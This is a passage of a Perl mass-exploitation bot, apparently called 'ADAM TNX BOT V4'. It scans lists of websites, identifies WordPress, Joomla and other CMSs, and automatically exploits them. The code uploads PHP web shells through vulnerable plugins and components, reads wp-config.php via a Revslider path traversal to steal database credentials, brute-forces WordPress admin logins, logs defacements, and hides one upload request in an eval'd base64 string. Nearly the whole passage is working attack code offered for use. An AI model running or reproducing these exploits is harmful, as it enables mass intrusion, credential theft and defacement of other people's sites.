    wordpress();
  }
  if ($target eq '3')
  {
    dv();
  }
  sub joomla(){
    print color("bold green")," Joomla List : ";
$opn=<STDIN>;
chomp $opn;
open(tarrget,"$opn") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /http:\/\//)
{
$target = "$target";
}

$website = $target.$tnxada;
 $vuln2 =$vulnn;

$req=HTTP::Request->new(GET=>$website);
$ua=LWP::UserAgent->new();
$ua->timeout(30);
$response=$ua->request($req);
if($response->content=~ $adam )

 {
 print color 'reset';
 $Messageee  ="$vulnn";
print color("bold Green"), "";
open (TEXT, '>>vulnjo.txt');
print TEXT "$target$vuln2\n";
close (TEXT);
}
else {

print color 'reset';
$Messageee = " not vuln !! ";
print color("bold red"), "";
}
{
print "[+] $target => $Messageee\n";

}

}
}
  }
  sub wordpress(){
    print color("bold red")," Wordpress List : ";
$opn=<STDIN>;
chomp $opn;
open(tarrget,"$opn") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /http:\/\//)
{
$target = "$target";
}

$website = $target.$tnxada;
 $vuln2 =$vulnn;

$req=HTTP::Request->new(GET=>$website);
$ua=LWP::UserAgent->new();
$ua->timeout(30);
$response=$ua->request($req);
if($response->content=~ $adam )

 {
 print color 'reset';
 $Messageee  ="$vulnn";
print color("bold Green"), "";
open (TEXT, '>>vuln.txt');
print TEXT "$target$vuln2\n";
close (TEXT);
}
else {

print color 'reset';
$Messageee = " Not vuln !  ";
print color("bold red"), "";
}
{
print "[+] $target => $Messageee\n";

}
$tnxada= "/xmlrpc.php";
chomp $tnxada;


$adam="XML-RPC";
chomp($adam);


$vulnn=" Wordpress vuln";
chomp($vulnn);



}


  }
  sub dv(){
    print color('bold red');

print $logo;
print "\nPut Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);
 
my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>adamtnxv3.txt");
print a "http://$1/\n";
close(a);
}
print "\nresult in adamtnxv3.txt";
  }
 ##########################
 ### wp brute forcer#######
 ##########################
 sub brute(){
  $logo="
 _                _        __                        
| |              | |      / _|                       
| |__  _ __ _   _| |_ ___| |_ ___  _ __ ___ ___ _ __ 
| '_ \| '__| | | | __/ _ \  _/ _ \| '__/ __/ _ \ '__|
| |_) | |  | |_| | ||  __/ || (_) | | | (_|  __/ |   
|_.__/|_|   \__,_|\__\___|_| \___/|_|  \___\___|_| 
                   wordpress brute forcer by [Adam Tnx]

\n";
  print color("bold yellow");
  print $logo;

  print " Put your websites list dude :D :\n";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Can't open the Website list !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

# Get da wordlist




print " Path to wordlist: "; 
my $passp=<STDIN>;
chomp($passp);
cp ("$passp","adamTnx.txt");


  
changenow: foreach $tofuck(@TARGETS){

chomp($tofuck);
$site = $tofuck;
if($site !~ /http:\/\//) { $site = "http://$site/"; };




#$aut="?author=1";
#$adamTnx=$site.$aut;
#$resp = $ua->request(HTTP::Request->new(GET => $adamTnx));
#$cont = $resp->content;
#while($cont =~ m/<title>(.*?) \|/g){
$admin = "admin";
#}
## Create Password List

$wp1 = $site . '/wp-login.php';
$resp = $ua->request(HTTP::Request->new(GET => $wp1));
$contg = $resp->content;
while($contg =~ m/<p id="backtoblog"><a href="http:\/\/(.*?)\//g){
$gpfw = $1;
}

print"\nI Will Generate a Passordlist \n[Wait].....................";
sleep(2);
#kif t7ot klem hna matasamihech recode ya noob :) 
@tnx = ('0','1','2','3','4','5','6','7','8','9','11','22','33','44','55','66','77','88','99','00','000','111','222','333','444','555','666','777','888','999','001','002','003','004','005','006','007','008','009','010','2000','2001','2002','2003','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','1','12','123','1234','12345','123456','1234567','12345678','123456789','1234567890','0987654321','987654321','87654321','7654321','654321','54321','4321','321','21','01','012','0123','01234','012345','0123456','01234567','012345678','0123456789','01234567890','0123456789','012345678','01234567','0123456','012345','01234','0123','012','121','131','124','123123','abc123','321321','321123','123321','112233','332211','102030','010203');
changenow: foreach $tnx(@tnx){
$pg="$gpfw$tnx";
$pg2="$admin$tnx";
open (TEXT, '>>adamTnx.txt');
print TEXT "$pg\n";
print TEXT "$pg2\n";
close (TEXT);
}
$pass = "adamTnx.txt";
  open (PASSWORD, "<$pass") || die "[-] Can't open the wordlist file !";
@PASSWORDS = <PASSWORD>;
close PASSWORD;
$pass=$#PASSWORDS + 1;



$red = $site . '/wp-admin/';
$wp = $site . '/wp-login.php';


print "\nSite: $site\nUser: $admin\n Wait bro...\n\n";

## boooom nigga

foreach $pass(@PASSWORDS){
chomp($pass);
print "searching $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
  if ($stat =~ /302/){

print colored ("[fucked and yfz] $site=> User :$admin Password:$pass",'bold white on_red'),"\n";
  open (TEXT, '>>fucked.txt');
  print TEXT "[BOOM] $site=> User :$admin Password:$pass\n\++++++++++Coded by Adam tnx / enjoy :D \n++++++++++\n";
  close (TEXT);

$fucked++;
    next changenow;
  }
  if ($stat =~ /404/){
  print "$site not a wordpress site \n";
  next changenow;
  };
}
}
if(!$link){$link=0;}if(!$fucked){$fucked=0;}
if($link){
print "\n[TOTAL BRUTED] websites -> $link \n[TOTAL FUCKED] websites -> $fucked\n";

}
 }
}


sub wyisax {
  print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
  $tnx="

                             
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             ' \n\n
";

    print color('bold magenta');

print $tnx;
print colored ("\tADAM TNX BOT V4 - PRV8 BOT WITH GOOD EXPLOITS \n",'white on_magenta');

    print color('reset');
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filter();
}
sub filter($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $tnxxy = $ua->get("$site")->content;
if($tnxxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print "[-] $site";  
   print color("bold green"), " - WordPress\n\n";     print color('reset');
open(save, '>>sites/wordpress.txt');
    print save "$site\n";
      close(save);
wysija();
}else{
  print "[-] $site";  
print  color("bold red"), " - Unknown\n\n";     print color('reset');

}
}



##############################
######wysija##################
##############################

sub wysija(){
  print color("green"),"[+]wysija[+].........[+] testing [+]\n";

$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['adam.zip', => 'adam.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaTnx = "$site/wp-content/uploads/wysija/themes/adam/tnx.php";
my $checkwysija = $ua->get("$wysijaTnx")->content;
if($checkwysija =~/adam tnx/) {
print color('bold white'),"[+]wysija[+]...";
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded\n";
print color('bold white'),"  [Link] => $wysijaTnx\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$wysijaTnx\n";
close (TEXT);
}else{
    print color('bold red');
print  "[+]wysija[+].........[+] 7achwa [+]\n";
    print color('reset');}
}
}



sub dzszoomsoundsx(){
  print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
$tnx="

                             
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             ' \n\n
";

    print color('bold blue');

print $tnx;
print colored ("\tADAM TNX BOT V4 - PRV8 BOT WITH GOOD EXPLOITS \n",'white on_blue');

    print color('reset');
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
efrez();
}
sub efrez{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $tnxxy = $ua->get("$site")->content;
if($tnxxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print "[-] $site";  
   print color("bold green"), " - WordPress\n\n";     print color('reset');
open(save, '>>sites/wordpress.txt');
    print save "$site\n";
      close(save);
dzszoomsounds();
}else{
  print "[-] $site";  
print  color("bold red"), " - Unknown\n\n";     print color('reset');

}
}



##############################
######dzszoomsounds##################
##############################

sub dzszoomsounds(){
 print color("bold green"),"[+]dzs-zoomsounds[+]...";

my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/tnx.php";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["tnx.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/adam tnx/) {

print color('bold white'),"[+]dzs-zoomsounds[+]...";
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dzsup\n";
open (TEXT, '>>rzlt/Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
 print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');
}
}
}

sub phpevent(){
  print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

$tnx="

                             
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             ' \n\n
";

    print color('bold red');

print $tnx;
print colored ("\tADAM TNX BOT V4 - PRV8 BOT WITH GOOD EXPLOITS \n",'white on_red');

    print color('reset');
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
lawej();
}
sub lawej($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $tnxxy = $ua->get("$site")->content;
if($tnxxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print "[-] $site";  
   print color("bold green"), " - WordPress\n\n";     print color('reset');
open(save, '>>sites/wordpress.txt');
    print save "$site\n";
      close(save);
PHP();
}else{
  print "[-] $site";  
print  color("bold red"), " - Unknown\n\n";     print color('reset');

}
}



##############################
######PHP Event Calendar##################
##############################

sub PHP(){
 print color("bold green"),"[+]PHP Event Calendar[+]...";

my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="tnx.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/tnx.php";

if ($response->content =~ /{"files/) {
print color('bold white'),"[+]PHP Event Calendar[+]...";
print color('bold green'),"[+]fucked[+]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded\n";
print color('bold white'),"  [Link] => $phpevup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
 print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');
}
}
}


sub beast(){
  print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
search();
}
sub search(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $tnxxy = $ua->get("$site")->content;
if($tnxxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print "[-] $site";  
   print color("bold green"), " - WordPress\n\n";     print color('reset');
open(save, '>>sites/wordpress.txt');
    print save "$site\n";
      close(save);
      wpinjetc();
    revshell();
  getconfig();
  formcraft();
  adblocker();
  cheryy();
  slideshow();
  worktf();
  

}

elsif($tnxxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print "[-] $site";  
   print color("bold green"), " - Joomla\n\n";         print color('reset');

open(save, '>>sites/joomla.txt');
    print save "$site\n";
    close(save);
  jceshell();
    comjce();
    comediaindex();
    comjdowloads();
comfabr();
simpleslideshow();

    }
elsif($tnxxy =~/\/Prestashop|\/js\/jquery\/plugins\/|<meta name=\"Generator\" content=\"Prestashop/) {
  print "[-] $site";  
   print color("bold green"), " - Prestashop\n\n";     print color('reset');

open(save, '>>sites/Prestashop.txt');
    print save "$site\n";
    close(save);
    columnadverts();
    }

  elsif($tnxxy =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
  print "[-] $site";  
   print color("bold white"), " - OpenCart\n\n";     print color('reset');

open(save, '>>sites/vbulletin.txt');
    print save "$site\n";
    close(save);
    }elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/) {
print "[-] $site";  
   print color("bold green"), " - vBulletin\n\n";     print color('reset');

open(save, '>>sites/vbulletin.txt');
    print save "$site\n";
    close(save);
    }
    else{
  print "[-] $site";  
print  color("bold red"), " - Unknown\n\n";     print color('reset');

}
}

sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold white'),"[+]Jce Upload Shell [+]...";


$drupalink = "http://localhost/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>rzlt/Shell3z.txt');
    print save "$site/images/stories/tnx3xp.php\n";
    close(save);
    }
else{
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');


        }

}
#####################




sub formcraft(){
print color('bold white')," [+]FormCraft Upload [+]...";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="xx.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzztnx = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//xx.php'; 
my $taz = $ua->get("$upzztnx")->content;
if ($taz =~ /Adam Tnx/){
   print color('bold green');
print "[+] Fucked [+]\n";
print color('reset');

open(save, '>>rzlt/Shell3z.txt');   
print save "$upzztnx\n";   
close(save);
}else{
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');}
}

}

  sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print color('bold white'),"[+] JCE Image Upload [+]...";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["tnx.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "[+] 7achwa [+]\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/tnx.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>rzlt/index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold green');
  print "[+] Fucked [+]\n";
    print color('reset');
zoneh();


}

}
else{
    print color('bold red');
print  "[+] 7achwa [+]\n";
    print color('reset');

}
    }
sub comediaindex(){
print color('bold white'),"[+] Com Media Index [+]...";
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";

$filemedia = "tnx.txt";
$indexmedia="$site/images/tnx.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$filemedia] ]);
 my $check = $ua->get("$indexmedia")->content;
if($check=~/Hacked/ ) {
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset'); 
        open (TEXT, '>>rzlt/index.txt');
        print TEXT "[ $indexmedia \n";
        close (TEXT);
zoneh();
        $def == $indexmedia;
   
        }
    } else{
    print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');
        }
}

######################
######################
######################
##### Jdownload ######
######################
######################
######################

    sub comjdowloads($site){
print color('bold white'),"[comjdowloads Upload]...";


$file="tnx.rar";
$filez="tnx.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/tnx.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Adam Tnx", mail=>"adamagrebi46@gmail.com", filetitle =>"Adam Tnx Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Adam Tnx/) {
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');        open (TEXT, '>>rzlt/Shell3z.txt');
        print TEXT "$shellpath\n";
        close (TEXT);
}

}else{
    print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');
}


print color('bold white'),"[comjdowloads Index ]...";

$def = $site . '/images/jdownloads/screenshots/tnx.html.j';
$filee="tnx.rar";
$filezz="tnx.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Adam Tnx", mail=>"adamagrebi46@gmail.com", filetitle =>"Adam Tnx Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');

        open (TEXT, '>>rzlt/index.txt');
        print TEXT "$def\n";
        close (TEXT);
zoneh();

}else{
print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');;
        }
}
else{
   print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');

}

    }


####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
print color('bold white'),"[+] Com Ads Manger [+]...";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["v3.jpg"], name => "v4.html"]);
if ($exploit->decoded_content =~ /v4.html/) {
        open(save, '>>rzlt/index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/v4.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Adam Tnx/) {
    print "[+] Fucked [+]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');

;
}
}






   sub mods($site){
print color('bold white'),"[+] mod_simplefileupload [+]...";

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="tnx_v4.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/udd.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/tnx_v4.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/Adam Tnx/) {
    print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');
        open (TEXT, '>>rzlt/Shell3z.txt');
        print TEXT "[ Shell LINK ] => $site/tnx_v4.php\n";
        close (TEXT);
            open (TEXT, '>>rzlt/index.txt');
            print TEXT "$site/v4.html\n";
        close (TEXT);

    $def =$site .'/v4.html';
zoneh();

}
else
{
     print color('bold red');
print "[+] 7achwa [+]\n";
    print color('reset');
}


}




######################
######################
######################
###### Revslider ######
######################
######################
######################
sub getconfig{
print color('bold white')," [+]Revslider Config [+]...";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "[+] Fucked [+]\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>rzlt/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>rzlt/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>rzlt/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>rzlt/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
    print color('bold red');
   print "[+] 7achwa [+]\n";
    print color('reset');

getcpconfig();

}

}
####################################################################################################
####################################################################################################



sub getcpconfig{
print color('bold white')," [+]Revslider Cpanel [+]...";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
